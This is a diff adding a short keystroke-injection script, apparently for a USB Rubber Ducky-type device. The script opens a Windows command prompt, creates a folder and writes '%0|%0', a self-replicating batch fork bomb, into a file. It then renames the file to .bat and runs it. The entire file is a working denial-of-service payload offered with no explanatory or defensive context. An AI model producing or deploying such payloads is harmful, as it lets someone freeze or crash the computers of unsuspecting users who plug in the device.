@@ -1,0 +1,28 @@
+GUI r
+DELAY 200
+STRING cmd
+ENTER
+DELAY 200
+STRING mkdir hello
+ENTER
+STRING cd hello
+DELAY 200
+ENTER
+STRING copy con bunnyfork.txt
+ENTER
+DELAY 200
+STRING %0|%0
+DELAY 200
+ENTER
+ALT F4
+GUI r
+DELAY 200
+STRING cmd
+ENTER
+DELAY 1000
+STRING cd hello
+ENTER
+STRING rename bunnyfork.txt bunnyfork.bat
+ENTER
+STRING bunnyfork.bat
+ENTER
